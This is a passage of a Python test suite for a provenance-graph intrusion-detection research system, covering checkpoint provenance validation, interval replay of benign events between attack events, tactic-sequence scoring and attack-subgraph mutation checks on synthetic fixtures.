        [(0, _prediction_commit_order(graph, 0, positions[0]), "Execution"),
         (1, _prediction_commit_order(graph, 1, positions[1]), "Discovery")],
        key=lambda row: row[1],
    )
    assert [row[0] for row in work] == [1, 0]
    queue = HostTacticQueues(3600, 5, 0.0, [{"source_id": "s", "tactics": ["Discovery", "Execution"]}])
    captures = []
    for node, order, tactic in work:
        captures.append(queue.append("h1", {
            "timestamp": order[0], "event_order": order[1], "host_id": "h1",
            "attack_entry_id": f"entry-{node}", "tactic_set": [tactic],
            "technique_set": [], "candidates": [],
        }))
    assert [row["queue_size"] for row in captures] == [1, 2]


def test_sequence_predictions_use_only_full_enhanced_when_four_variants_are_loaded():
    alignments = [{
        "source_scene": "cadets314", "host_id": "h1", "attack_id": "prediction-1",
        "aligned_top_k_chains": [{"tactics": ["Execution"]}],
    }]
    interps = [{
        "dataset": "cadets", "scene": "cadets314", "mapping_variant": variant,
        "detection_checkpoint": {
            "sha256": "a" * 64, "source_dataset": "cadets", "source_scene": "cadets314",
            "source_run_mode": "complete", "source_variant": "full-athena",
            "source_augmentation": {"manifest_sha256": "b" * 64},
        },
        "final_attack_predictions": alignments,
    } for variant in ("direct", "tech-enhanced", "log-enhanced", "full-enhanced")]
    predictions = sequence_predictions_from_outputs(interps, [], [])
    assert len(predictions) == 1
    assert predictions[0]["condition"] == "Basic"


def test_e5_unseen_rejects_checkpoint_from_the_wrong_e3_platform():
    interp = {
        "dataset": "cadets5", "scene": "cadets104", "mapping_variant": "full-enhanced",
        "detection_checkpoint": {
            "sha256": "a" * 64, "source_dataset": "theia",
            "source_run_mode": "complete", "source_variant": "full-athena",
            "source_augmentation": {"manifest_sha256": "b" * 64},
        },
        "final_attack_predictions": [{
            "source_scene": "cadets104", "host_id": "h1", "attack_id": "prediction-1",
            "aligned_top_k_chains": [],
        }],
    }
    with pytest.raises(ValueError, match="paired complete E3 checkpoint"):
        sequence_predictions_from_outputs([interp], [], [])


def test_transfer_detection_contract_is_accepted_only_with_bound_e3_checkpoint(tmp_path):
    checkpoint = {
        "path": "/tmp/e3.pt", "sha256": "b" * 64,
        "source_dataset": "cadets", "source_scene": "cadets314",
        "source_split": {"train_snapshots": [0], "test_snapshots": [1]},
        "source_run_mode": "complete", "source_variant": "full-athena",
        "source_augmentation": {"manifest_sha256": "c" * 64},
    }
    payload = {
        "dataset": "cadets5", "scene": "cadets104", "execution": "eval-only",
        "checkpoint": checkpoint,
        "split": {
            "mode": "e3-checkpoint-transfer-eval", "train_snapshots": [],
            "test_snapshots": [0], "source_training": checkpoint,
        },
        "predictions": [{
            "snapshot": 0, "uuid": "node", "pred_label": 1, "split": "test",
        }],
    }
    path = tmp_path / "detection.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    assert _load_detected_nodes(
        str(path), expected_dataset="cadets5", expected_scene="cadets104",
    ) == {0: {"node"}}
    payload["execution"] = "train-save"
    path.write_text(json.dumps(payload), encoding="utf-8")
    with pytest.raises(RuntimeError, match="checkpoint provenance"):
        _load_detected_nodes(str(path), expected_dataset="cadets5", expected_scene="cadets104")


def test_transfer_detection_contract_rejects_wrong_e3_platform_and_train_rows(tmp_path):
    checkpoint = {
        "path": "/tmp/e3.pt", "sha256": "b" * 64,
        "source_dataset": "theia", "source_scene": None,
        "source_split": {"train_snapshots": [0], "test_snapshots": [1]},
        "source_run_mode": "complete", "source_variant": "full-athena",
        "source_augmentation": {"manifest_sha256": "c" * 64},
    }
    payload = {
        "dataset": "cadets5", "scene": "cadets104", "execution": "eval-only",
        "checkpoint": checkpoint,
        "split": {
            "mode": "e3-checkpoint-transfer-eval", "train_snapshots": [],
            "test_snapshots": [0], "source_training": checkpoint,
        },
        "predictions": [],
    }
    path = tmp_path / "detection.json"
    path.write_text(json.dumps(payload), encoding="utf-8")
    with pytest.raises(RuntimeError, match="checkpoint provenance"):
        _load_detected_nodes(
            str(path), expected_dataset="cadets5", expected_scene="cadets104",
        )

    checkpoint["source_dataset"] = "cadets"
    payload["predictions"] = [{
        "snapshot": 0, "uuid": "node", "pred_label": 0, "split": "train",
    }]
    path.write_text(json.dumps(payload), encoding="utf-8")
    with pytest.raises(RuntimeError, match="held-out test rows only"):
        _load_detected_nodes(
            str(path), expected_dataset="cadets5", expected_scene="cadets104",
        )


def test_e5_eval_only_uses_the_whole_target_stream_without_internal_split():
    handler = SimpleNamespace(snapshots=[object()])
    train_ids, test_ids, split = _initial_split(handler, "cadets5", "eval-only", 0.70)
    assert train_ids == [] and test_ids == [0]
    assert split["target_stream"] == "all-e5-snapshots"


def test_graph_build_and_mlp_training_do_not_write_implicit_cwd_artifacts(tmp_path, monkeypatch):
    class Processor(BaseProcessor):
        def load(self):
            return None

        def create_snapshots_from_graph(self, df, is_malicious):
            return []

    monkeypatch.chdir(tmp_path)
    Processor(tmp_path, True).build_graph("fixture")
    classifier = MLPClassify(num_epochs=1, batch_size=2, seed=7)
    classifier.train(
        np.asarray([[0.0, 0.0], [0.1, 0.0]], dtype=np.float32),
        np.asarray([[1.0, 1.0], [0.9, 1.0]], dtype=np.float32),
    )
    assert not list(tmp_path.glob("all_snapshots*"))
    assert not list(tmp_path.glob("snapshot_data*"))
    assert not (tmp_path / "mlp_classifier.pth").exists()
    assert not (tmp_path / "mlp_meta.pkl").exists()


def test_word2vec_features_are_reproducible_with_detection_seed():
    graph = ig.Graph()
    graph.add_vertices(2)
    graph.vs["name"] = ["process", "file"]
    graph.vs["type"] = ["SUBJECT_PROCESS", "FILE_OBJECT"]
    graph.vs["properties"] = ["curl --url http://example", "/tmp/example"]
    graph.vs["label"] = [0, 0]
    vectors = []
    for _ in range(2):
        encoder = ATHENAEncoder(
            [graph, graph.copy()], prop_feat_dim=8, enc_hidden_dim=4, enc_out_dim=4,
            train_indices=[0], test_indices=[1], w2v_epochs=3, seed=17,
        )
        encoder._ensure_w2v_model()
        vectors.append(encoder._w2v_model.wv["curl"].copy())
    np.testing.assert_array_equal(vectors[0], vectors[1])

def test_interval_replay_runner_requires_hashed_plan_and_bilateral_reuse_policy(tmp_path):
    from scripts.run_interval_replay import _validate_source_events

    boundary = tmp_path / "boundaries.jsonl"
    boundary.write_text("{}\n", encoding="utf-8")
    source_record = tmp_path / "source.json"
    source_record.write_text("{}\n", encoding="utf-8")
    source_plan = tmp_path / "source-plan.jsonl"
    def write_plan(rows):
        source_plan.write_text("\n".join(json.dumps(row) for row in rows) + "\n", encoding="utf-8")

    def plan_row(source_id, before, after, snapshot, start, end, policy="forbid"):
        return {
            "source_id": source_id, "source_record": str(source_record),
            "source_hash": attackseq_sha256(source_record), "source_corpus": "fixture",
            "dataset": "cadets", "condition": "24h", "host": "h1",
            "before_attack_event_id": before, "after_attack_event_id": after,
            "reuse_policy": policy, "source_snapshots": [snapshot],
            "source_snapshot_sha256": [f"{snapshot}" * 64],
            "source_start_timestamp": start, "source_end_timestamp": end,
        }
    day_ns = 86_400_000_000_000
    plan_rows = [plan_row("plan-1", "a", "b", 1, 0, day_ns),
                 plan_row("plan-2", "b", "c", 2, day_ns, 2 * day_ns)]
    write_plan(plan_rows)
    manifest = {
        "schema_version": 2, "dataset": "cadets", "scene": None, "condition": "24h",
        "attack_event_boundaries": {
            "path": str(boundary), "sha256": attackseq_sha256(boundary),
        },
        "benign_source_plan": {
            "path": str(source_plan), "sha256": attackseq_sha256(source_plan),
        },
        "source_snapshot_reuse": False,
        "replay_gaps": [
            {"attack_event_id": "a", "next_attack_event_id": "b",
             "source_plan_id": "plan-1", "reuse_policy": "forbid",
             "source_slice_reused": False, "source_snapshots": [1],
             "source_snapshot_sha256": ["1" * 64], "source_scene": "cadets314", "host": "h1",
             "source_start_timestamp": 0, "source_end_timestamp": day_ns},
            {"attack_event_id": "b", "next_attack_event_id": "c",
             "source_plan_id": "plan-2", "reuse_policy": "forbid",
             "source_slice_reused": False, "source_snapshots": [2],
             "source_snapshot_sha256": ["2" * 64], "source_scene": "cadets314", "host": "h1",
             "source_start_timestamp": day_ns, "source_end_timestamp": 2 * day_ns},
        ],
    }
    path = tmp_path / "events.json"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    assert _validate_source_events(path, "cadets", None, "24h") == manifest

    plan_rows = [plan_row("plan-1", "a", "b", 1, 0, day_ns, "allow"),
                 plan_row("plan-2", "b", "c", 1, 0, day_ns, "allow")]
    write_plan(plan_rows)
    manifest["benign_source_plan"]["sha256"] = attackseq_sha256(source_plan)
    for gap, row in zip(manifest["replay_gaps"], plan_rows):
        gap.update({
            "source_plan_id": row["source_id"], "reuse_policy": row["reuse_policy"],
            "source_snapshots": row["source_snapshots"],
            "source_snapshot_sha256": row["source_snapshot_sha256"],
            "source_start_timestamp": row["source_start_timestamp"],
            "source_end_timestamp": row["source_end_timestamp"],
        })
    manifest["replay_gaps"][1]["source_slice_reused"] = True
    manifest["source_snapshot_reuse"] = True
    path.write_text(json.dumps(manifest), encoding="utf-8")
    assert _validate_source_events(path, "cadets", None, "24h") == manifest

    plan_rows[1]["reuse_policy"] = "forbid"
    write_plan(plan_rows)
    manifest["benign_source_plan"]["sha256"] = attackseq_sha256(source_plan)
    manifest["replay_gaps"][1]["reuse_policy"] = "forbid"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(ValueError, match="bilateral"):
        _validate_source_events(path, "cadets", None, "24h")

    source_plan.write_text(source_plan.read_text(encoding="utf-8") + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="path/hash"):
        _validate_source_events(path, "cadets", None, "24h")


def test_benign_source_window_rejects_event_at_exclusive_end():
    frame = pd.DataFrame([{"event_id": "late", "timestamp": 200, "host_id": "h1"}])
    with pytest.raises(ValueError, match="outside"):
        validate_source_event_window(frame, 100, 200, "h1")


def test_benign_source_plan_requires_minute_aligned_window(tmp_path):
    from scripts.build_benign_injection_manifest import _load_source_plan

    source = tmp_path / "source.json"
    source.write_text("{}\n", encoding="utf-8")
    plan = tmp_path / "plan.jsonl"
    plan.write_text(json.dumps({
        "source_id": "p", "source_record": str(source),
        "source_hash": attackseq_sha256(source), "source_corpus": "fixture",
        "dataset": "cadets", "condition": "24h", "host": "h1",
        "before_attack_event_id": "a", "after_attack_event_id": "b",
        "reuse_policy": "forbid", "source_snapshots": [1],
        "source_snapshot_sha256": ["a" * 64],
        "source_start_timestamp": 1,
        "source_end_timestamp": 86_400_000_000_001,
    }) + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="lacks provenance"):
        _load_source_plan(plan, "cadets", "24h")

def test_interval_replay_splits_two_attack_events_in_one_snapshot_and_rewindows(tmp_path):
    attack = ig.Graph(directed=True)
    attack.add_vertices(4)
    attack.vs["name"] = ["p", "f1", "f2", "f3"]
    attack.vs["type"] = ["SUBJECT_PROCESS", "FILE_OBJECT", "FILE_OBJECT", "FILE_OBJECT"]
    attack.vs["properties"] = ["bash,,/bin/bash", "/tmp/a", "/tmp/b", "/tmp/c"]
    attack.vs["label"] = [1, 0, 0, 0]
    attack.vs["_athena_temporal_id"] = ["h1:p", "h1:f1", "h1:f2", "h1:f3"]
    attack.add_edge(0, 1, actions="write", timestamp=1.7e18, event_id="attack-1", event_order=0)
    attack.add_edge(0, 2, actions="read", timestamp=1.7e18 + 30e9, event_id="attack-2", event_order=1)
    attack.add_edge(0, 3, actions="write", timestamp=1.7e18 + 60e9, event_id="attack-3", event_order=2)
    attack["host_id"] = "h1"
    attack["source_scene"] = "cadets314"
    attack["host_id_source"] = "fixture"
    attack["window_start"] = 1.7e9
    benign = ig.Graph(directed=True)
    benign.add_vertices(2)
    benign.vs["name"] = ["bp", "bf"]
    benign.vs["type"] = ["SUBJECT_PROCESS", "FILE_OBJECT"]
    benign.vs["properties"] = ["systemd,,/usr/bin/systemd", "/var/log/a"]
    benign.vs["label"] = [0, 0]
    benign.vs["_athena_temporal_id"] = ["h1:bp", "h1:bf"]
    benign.add_edge(0, 1, actions="write", timestamp=1.6e18, event_id="benign", event_order=0)
    benign["host_id"], benign["source_scene"] = "h1", "cadets314"
    benign["host_id_source"], benign["window_start"] = "fixture", 1_599_999_960.0

    source_record = tmp_path / "rq3-source.json"
    source_record.write_text('{"case":"case-1"}\n', encoding="utf-8")
    boundary = tmp_path / "boundaries.jsonl"
    boundary.write_text("\n".join(json.dumps({
        "source_id": f"case-{index}", "source_record": str(source_record),
        "source_hash": attackseq_sha256(source_record), "source_corpus": "rq3",
        "dataset": "cadets", "scene": "cadets314", "host": "h1",
        "record_type": "sequence" if index == 1 else "attack_event",
        "attack_event_id": f"attack-event-{index}",
        **({"prediction_id": "prediction-1"} if index == 1 else {}),
        "boundary": {"snapshot": 0, "event_id": f"attack-{index}", "anchor": "p",
                     "event_sha256": event_sha256(attack, index - 1)},
    }) for index in (1, 2, 3)) + "\n", encoding="utf-8")
    source_plan = tmp_path / "source-plan.jsonl"
    plan_rows = [{
        "source_id": f"source-plan-{index}", "source_record": str(source_record),
        "source_hash": attackseq_sha256(source_record), "source_corpus": "rq3-benign",
        "dataset": "cadets", "condition": "24h", "host": "h1",
        "before_attack_event_id": f"attack-event-{index}",
        "after_attack_event_id": f"attack-event-{index + 1}",
        "reuse_policy": "allow", "source_snapshots": [1],
        "source_snapshot_sha256": [graph_sha256(benign)],
        "source_start_timestamp": 1_599_999_960_000_000_000,
        "source_end_timestamp": 1_600_086_360_000_000_000,
    } for index in (1, 2)]
    source_plan.write_text("\n".join(json.dumps(row) for row in plan_rows) + "\n", encoding="utf-8")
    manifest = {
        "schema_version": 2, "dataset": "cadets", "scene": "cadets314", "condition": "24h",
        "base_split": {"train_snapshots": [1], "test_snapshots": [0]},
        "attack_event_boundaries": {"path": str(boundary), "sha256": attackseq_sha256(boundary)},
        "benign_source_plan": {"path": str(source_plan), "sha256": attackseq_sha256(source_plan)},
        "source_snapshot_reuse": True,
        "inserted_benign_events": [{
            "label": 0, "source_event_id": "benign", "source_snapshot": 1,
            "attack_event_id": "attack-event-1", "source_plan_id": "source-plan-1",
            "source_event_payload": {"source": "bp", "target": "bf", "action": "write", "event_id": "benign"},
            "source_event_hash": hashlib.sha256(json.dumps(
                {"source": "bp", "target": "bf", "action": "write", "event_id": "benign"},
                sort_keys=True, separators=(",", ":"),
            ).encode()).hexdigest(),
            "source_locator": "snapshot:1/edge:0",
        }],
        "replay_gaps": [{
            "attack_event_id": "attack-event-1", "next_attack_event_id": "attack-event-2",
            "source_scene": "cadets314", "next_source_scene": "cadets314", "host": "h1",
            "interval_seconds": 86400,
            "before": {"snapshot": 0, "edge_index": 0, "event_id": "attack-1",
                       "event_sha256": event_sha256(attack, 0)},
            "after": {"snapshot": 0, "edge_index": 1, "event_id": "attack-2",
                      "event_sha256": event_sha256(attack, 1)},
            "source_snapshots": [1], "source_snapshot_sha256": [graph_sha256(benign)],
            "source_plan_id": "source-plan-1", "reuse_policy": "allow", "source_slice_reused": False,
            "source_start_timestamp": 1_599_999_960_000_000_000,
            "source_end_timestamp": 1_600_086_360_000_000_000,
        }, {
            "attack_event_id": "attack-event-2", "next_attack_event_id": "attack-event-3",
            "source_scene": "cadets314", "next_source_scene": "cadets314", "host": "h1",
            "interval_seconds": 86400,
            "before": {"snapshot": 0, "edge_index": 1, "event_id": "attack-2",
                       "event_sha256": event_sha256(attack, 1)},
            "after": {"snapshot": 0, "edge_index": 2, "event_id": "attack-3",
                      "event_sha256": event_sha256(attack, 2)},
            "source_snapshots": [1], "source_snapshot_sha256": [graph_sha256(benign)],
            "source_plan_id": "source-plan-2", "reuse_policy": "allow", "source_slice_reused": True,
            "source_start_timestamp": 1_599_999_960_000_000_000,
            "source_end_timestamp": 1_600_086_360_000_000_000,
        }],
    }
    path = tmp_path / "replay.json"
    handler = DARPAHandler.__new__(DARPAHandler)
    handler.snapshots, handler.all_labels = [attack, benign], {"p"}
    handler.begin = pd.DataFrame([{
        "actorID": "bp", "objectID": "bf", "action": "write", "timestamp": 1_600_000_000_000_000_000,
        "actor_type": "SUBJECT_PROCESS", "object": "FILE_OBJECT", "exec": "systemd",
        "path": "/var/log/a", "host_id": "h1", "host_id_source": "fixture",
        "source_scene": "cadets314", "event_id": "benign",
    }])
    handler.malicious = pd.DataFrame([
        {"actorID": "p", "objectID": "f1", "action": "write", "timestamp": 1_700_000_000_000_000_000,
         "actor_type": "SUBJECT_PROCESS", "object": "FILE_OBJECT", "exec": "bash",
         "path": "/tmp/a", "host_id": "h1", "host_id_source": "fixture",
         "source_scene": "cadets314", "event_id": "attack-1"},
        {"actorID": "p", "objectID": "f2", "action": "read", "timestamp": 1_700_000_030_000_000_000,
         "actor_type": "SUBJECT_PROCESS", "object": "FILE_OBJECT", "exec": "bash",
         "path": "/tmp/b", "host_id": "h1", "host_id_source": "fixture",
         "source_scene": "cadets314", "event_id": "attack-2"},
        {"actorID": "p", "objectID": "f3", "action": "write", "timestamp": 1_700_000_060_000_000_000,
         "actor_type": "SUBJECT_PROCESS", "object": "FILE_OBJECT", "exec": "bash",
         "path": "/tmp/c", "host_id": "h1", "host_id_source": "fixture",
         "source_scene": "cadets314", "event_id": "attack-3"},
    ])
    benign_raw_row = _event_dataframe(handler, {"benign"}).iloc[0]
    manifest["inserted_benign_events"][0]["source_event_payload"] = canonical_event_row_payload(benign_raw_row)
    manifest["inserted_benign_events"][0]["source_event_hash"] = canonical_event_row_sha256(benign_raw_row)
    second_provenance = dict(manifest["inserted_benign_events"][0])
    second_provenance.update({
        "attack_event_id": "attack-event-2", "source_plan_id": "source-plan-2",
    })
    manifest["inserted_benign_events"].append(second_provenance)
    from scripts.build_benign_injection_manifest import _load_boundaries
    manifest["attack_events"] = _load_boundaries(
        boundary, handler, "cadets", "cadets314", [0],
    )
    manifest["attack_events"].sort(key=lambda row: row["boundary"]["event_time"])
    manifest["attack_predictions"] = [row for row in manifest["attack_events"] if row.get("prediction_id")]
    manifest["replay_gaps"][0]["before"] = manifest["attack_events"][0]["boundary"]
    manifest["replay_gaps"][0]["after"] = manifest["attack_events"][1]["boundary"]
    manifest["replay_gaps"][1]["before"] = manifest["attack_events"][1]["boundary"]
    manifest["replay_gaps"][1]["after"] = manifest["attack_events"][2]["boundary"]
    path.write_text(json.dumps(manifest), encoding="utf-8")
    original_plan = source_plan.read_text(encoding="utf-8")
    source_plan.write_text(original_plan + "\n", encoding="utf-8")
    with pytest.raises(ValueError, match="source-plan path/hash"):
        apply_interval_replay(
            handler, path, "cadets", "cadets314", expected_split=manifest["base_split"],
        )
    source_plan.write_text(original_plan, encoding="utf-8")
    manifest["replay_gaps"][0]["reuse_policy"] = "forbid"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(ValueError, match="differs from the hashed benign source plan"):
        apply_interval_replay(
            handler, path, "cadets", "cadets314", expected_split=manifest["base_split"],
        )
    manifest["replay_gaps"][0]["reuse_policy"] = "allow"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    for field, value in (
        ("timestamp", 1), ("exec", "tampered"), ("path", "/tampered"),
        ("_athena_input_order", 99),
    ):
        tampered = json.loads(json.dumps(manifest))
        payload = tampered["inserted_benign_events"][0]["source_event_payload"]
        payload[field] = value
        tampered["inserted_benign_events"][0]["source_event_hash"] = hashlib.sha256(json.dumps(
            payload, ensure_ascii=False, sort_keys=True, separators=(",", ":"),
        ).encode("utf-8")).hexdigest()
        path.write_text(json.dumps(tampered), encoding="utf-8")
        with pytest.raises(ValueError, match="differs from the source audit edge"):
            apply_interval_replay(
                handler, path, "cadets", "cadets314", expected_split=manifest["base_split"],
            )
    path.write_text(json.dumps(manifest), encoding="utf-8")
    inserted, meta = apply_interval_replay(
        handler, path, "cadets", "cadets314",
        expected_split=manifest["base_split"],
    )
    all_edges = [edge for index in [0, *inserted] for edge in handler.snapshots[index].es]
    times = {edge["event_id"]: edge["timestamp"] for edge in all_edges}
    assert times["attack-2"] - times["attack-1"] == 86430.0
    assert times["attack-3"] - times["attack-2"] == 86430.0
    replay_ids = [value for value in times if value.startswith("replay:24h:")]
    assert len(replay_ids) == 2
    first_replay = next(value for value in replay_ids if ":attack-event-1:" in value)
    second_replay = next(value for value in replay_ids if ":attack-event-2:" in value)
    assert times["attack-1"] <= times[first_replay] < times["attack-2"]
    assert times["attack-2"] <= times[second_replay] < times["attack-3"]
    assert len(inserted) >= 1
    replay_edge = next(edge for edge in all_edges if edge["event_id"] == first_replay)
    assert replay_edge["source_event_id"] == "benign"
    assert replay_edge["replay_source_snapshot"] == 1
    assert meta["sha256"] == attackseq_sha256(path)


def test_table_viii_sequence_scorer_uses_lcs_for_each_proof_condition():
    attackseq = [{
        "source_id": "as1", "tactics": ["Initial Access", "Execution", "Discovery"],
    }]
    predictions = [
        {
            "condition": condition,
            "dataset": "cadets5" if condition == "E5" else "cadets",
            "scene": "cadets104" if condition == "E5" else "cadets314",
            "host_id": "h1", "attack_id": "attack-e5" if condition == "E5" else "attack-e3",
            "candidate_tactic_chains": [{
                "tactics": chain, "attackseq_source_id": "as1",
            }],
        }
        for condition, chain in (
            ("Basic", ["Initial Access", "Execution", "Discovery"]),
            ("24h", ["Initial Access", "Discovery"]),
            ("48h", ["Impact"]),
            ("72h", ["Execution", "Discovery"]),
            ("E5", ["Initial Access", "Execution", "Discovery"]),
        )
    ]
    truth = [
        {
            "record_type": "sequence", "source_id": "gt-e3", "dataset": "cadets",
            "scene": "cadets314", "host_id": "h1", "attack_id": "attack-e3",
            "reference_tactic_sequence": ["Initial Access", "Execution", "Discovery"],
        },
        {
            "record_type": "sequence", "source_id": "gt-e5", "dataset": "cadets5",
            "scene": "cadets104", "host_id": "h1", "attack_id": "attack-e5",
            "reference_tactic_sequence": ["Initial Access", "Execution", "Discovery"],
        },
    ]
    result = score_sequence_conditions(predictions, truth, attackseq)
    assert result["condition_counts"]["Basic"]["1"]["FM"] == 1
    assert result["condition_counts"]["24h"]["1"]["PM"] == 1
    assert result["condition_counts"]["48h"]["1"]["Miss"] == 1
    assert result["condition_counts"]["72h"]["1"]["PM"] == 1
    assert result["condition_counts"]["E5"]["1"]["FM"] == 1


def test_table_viii_top_k_promotes_only_when_a_full_reference_is_present():
    base_prediction = {
        "dataset": "cadets", "scene": "cadets314",
        "host_id": "h1", "attack_id": "attack-top-k",
        "candidate_tactic_chains": [
            {"tactics": ["Execution"], "attackseq_source_id": "as1"},
            {
                "tactics": ["Initial Access", "Execution", "Discovery"],
                "attackseq_source_id": "as2",
            },
        ],
    }
    predictions = [
        {**base_prediction, "condition": condition}
        for condition in ("Basic", "24h", "48h", "72h")
    ]
    truth = [{
        "record_type": "sequence", "source_id": "gt-top-k",
        "dataset": "cadets", "scene": "cadets314", "host_id": "h1",
        "attack_id": "attack-top-k",
        "reference_tactic_sequence": ["Initial Access", "Execution", "Discovery"],
    }]
    library = [{"source_id": "as1"}, {"source_id": "as2"}]
    result = score_sequence_conditions(predictions, truth, library)
    assert result["condition_counts"]["Basic"]["1"]["PM"] == 1
    assert result["condition_counts"]["Basic"]["3"]["FM"] == 1
    assert result["condition_counts"]["Basic"]["5"]["FM"] == 1


def test_verifier_rejects_any_failed_check(monkeypatch):
    import src.augmentation.verifier as verifier

    monkeypatch.setattr(verifier, "check_operation_legality", lambda *args, **kwargs: False)
    monkeypatch.setattr(verifier, "check_attribute_feasibility", lambda *args, **kwargs: True)
    monkeypatch.setattr(verifier, "check_imperceptibility", lambda *args, **kwargs: True)
    monkeypatch.setattr(verifier, "check_hardness", lambda *args, **kwargs: True)

    passed, failed = verify_mutation(None, None, set(), {}, {})

    assert passed is False
    assert failed == ["operation_legality"]


def test_subgraph_replacement_inserts_unmatched_attack_nodes_and_redirects_boundary():
    g_b = ig.Graph(directed=True)
    g_b.add_vertices(3)
    g_b.vs[0]["name"] = "ctx"
    g_b.vs[0]["type"] = "process"
    g_b.vs[1]["name"] = "benign"
    g_b.vs[1]["type"] = "process"
    g_b.vs[2]["name"] = "outside"
    g_b.vs[2]["type"] = "file"
    g_b.add_edge(0, 1, actions="read")
    g_b.add_edge(1, 2, actions="write")

    g_a = ig.Graph(directed=True)
    g_a.add_vertices(2)
    g_a.vs[0]["name"] = "attack-proc"
    g_a.vs[0]["type"] = "process"
    g_a.vs[1]["name"] = "attack-file"
    g_a.vs[1]["type"] = "file"
    g_a.vs["label"] = [1, 1]
    g_a.vs["_athena_anchor"] = [True, False]
    g_a.add_edge(0, 1, actions="execute", event_id="attack-event", event_order=0)

    g_mut = subgraph_replacement(g_b, g_a, S_b_nodes=[1], S_a_nodes=[0, 1], pi={0: 1})

    assert g_mut is not None
    assert "benign" not in set(g_mut.vs["name"])
    assert {"attack-proc", "attack-file", "ctx", "outside"} == set(g_mut.vs["name"])
    replaced = {
        g_mut.vs[idx]["name"]
        for idx, flag in enumerate(g_mut.vs["_athena_replaced_region"])
        if bool(flag)
    }
    assert replaced == {"attack-proc", "attack-file"}
    edges = {(g_mut.vs[e.source]["name"], g_mut.vs[e.target]["name"], e["actions"]) for e in g_mut.es}
    assert ("ctx", "attack-proc", "read") in edges
    assert ("attack-proc", "outside", "write") in edges
    assert ("attack-proc", "attack-file", "execute") in edges
    fidelity_ok, fidelity = check_attack_chain_fidelity(g_mut)
    assert fidelity_ok is True
    assert fidelity["preserved_ratio"] == 1.0

    internal_edge = next(
        edge.index for edge in g_mut.es
        if bool(edge.attributes().get("_athena_introduced_edge", False))
    )
    broken = g_mut.copy()
    broken.delete_edges([internal_edge])
    fidelity_ok, fidelity = check_attack_chain_fidelity(broken)
    assert fidelity_ok is False
    assert fidelity["preserved_edges"] == 0


def test_verifier_uses_entity_level_ops_and_per_attribute_values():
    benign = ig.Graph(directed=True)
    benign.add_vertices(2)
    benign.vs[0]["name"] = "proc-a"
    benign.vs[0]["type"] = "process"
    benign.vs[0]["path"] = "/bin/ls"
    benign.vs[1]["name"] = "file-a"
    benign.vs[1]["type"] = "file"
    benign.vs[1]["path"] = "/var/log/auth.log"
    benign.add_edge(0, 1, actions="read")
    entity_ops, type_attrs = build_historical_profiles([(benign, None)])

    mutated = ig.Graph(directed=True)
    mutated.add_vertices(2)
    mutated.vs[0]["name"] = "proc-b"
    mutated.vs[0]["type"] = "process"
    mutated.vs[0]["path"] = "/bin/ls"
    mutated.vs[1]["name"] = "file-a"
    mutated.vs[1]["type"] = "file"
    mutated.vs[1]["path"] = "/var/log/auth.log"
    mutated.add_edge(0, 1, actions="read", _athena_boundary_edge=True)

    # Distinct UUID/name but the same source type/class must share a benign
    # operation profile.
    assert check_operation_legality(mutated, {0}, entity_ops) is True
    mutated.es[0]["actions"] = "write"
    assert check_operation_legality(mutated, {0}, entity_ops) is False
    mutated.es[0]["actions"] = "read"

    mutated.vs[0]["name"] = "proc-a"
    mutated.vs[0]["path"] = "/tmp/not-observed"
    mutated.vs[0]["_athena_semantic_modified"] = True
    mutated.vs[0]["_athena_semantic_changed_fields"] = ["path"]
    mutated.vs[0]["_athena_attack_original_mutable_attributes"] = {"path": "/bin/ls"}
    assert check_attribute_feasibility(mutated, {0}, type_attrs) is False

    mutated.vs[0]["path"] = "/bin/ls"
    mutated.vs[0]["_athena_replaced_region"] = True
    assert check_attribute_feasibility(mutated, {0}, type_attrs) is True


@pytest.mark.parametrize(
    ("dataset", "action", "target_property", "category"),
    [
        ("cadets", "EVENT_WRITE", "/run/gui/window", "gui"),
        ("cadets5", "EVENT_WRITE", "/run/notification/toast", "notification"),
        ("optcday1", "WRITE", "/run/pam/password_prompt", "auth_prompt"),
        ("atlas", "file_write", "/dev/audio", "audible"),
        ("atlas", "file_write", "/dev/tty", "visual"),
    ],
)
def test_imperceptibility_maps_real_parser_actions(dataset, action, target_property, category):
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["type"] = ["process", "ui_object"]
    graph.vs["properties"] = ["worker,1,/bin/worker", target_property]
    graph.add_edge(0, 1, actions=action, _athena_introduced_edge=True)
    graph["dataset"] = dataset

    report = imperceptibility_coverage(graph)

    assert report["category_counts"][category] == 1
    assert check_imperceptibility(graph, {0, 1}) is False


def test_atlas_imperceptibility_uses_normalized_file_action():
    _actor, _actor_type, _obj, _object_type, action = normalize_file_event(
        "worker", "/dev/audio", "write",
    )
    assert action == "file_write"


def test_imperceptibility_accepts_non_visible_introduced_event():
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["type"] = ["process", "file"]
    graph.vs["properties"] = ["worker,1,/bin/worker", "/var/log/app.log"]
    graph.add_edge(0, 1, actions="EVENT_READ", _athena_introduced_edge=True)
    graph["dataset"] = "cadets"

    assert check_imperceptibility(graph, {0, 1}) is True


def test_edge_mutation_add_candidates_cover_both_boundary_directions():
    g = ig.Graph(directed=True)
    g.add_vertices(2)
    g.vs[0]["type"] = "process"
    g.vs[0]["properties"] = "attack"
    g.vs[1]["type"] = "file"
    g.vs[1]["properties"] = "context"
    g.vs[0]["_athena_boundary_context"] = False
    g.vs[1]["_athena_boundary_context"] = True
    g.add_edge(0, 1, actions="read")

    candidates = propose_candidate_new_edges(g, {0}, max_candidates=4)

    assert (1, 0, "read") in candidates
    assert all(action == "read" for _, _, action in candidates)


def test_detection_split_uses_benign_days_and_held_out_attack_days():
    class Handler:
        pass

    handler = Handler()
    handler.snapshots = []
    for ts, label in [
        (1704067200, 0),  # benign day 1
        (1704153600, 0),  # benign day 2
        (1704240000, 1),  # attack day 1
        (1704326400, 1),  # attack day 2
    ]:
        g = ig.Graph(directed=True)
        g.add_vertices(1)
        g.vs[0]["timestamp"] = ts
        g.vs[0]["label"] = label
        handler.snapshots.append(g)

    train_ids, test_ids, meta = build_split(handler, 0.5)

    assert meta["mode"] == "date_partition_benign_days_and_attack_days"
    assert train_ids == [0, 1, 2]
    assert test_ids == [3]


def test_split_does_not_split_a_single_attack_day_within_the_day():
    class Handler:
        pass

    handler = Handler()
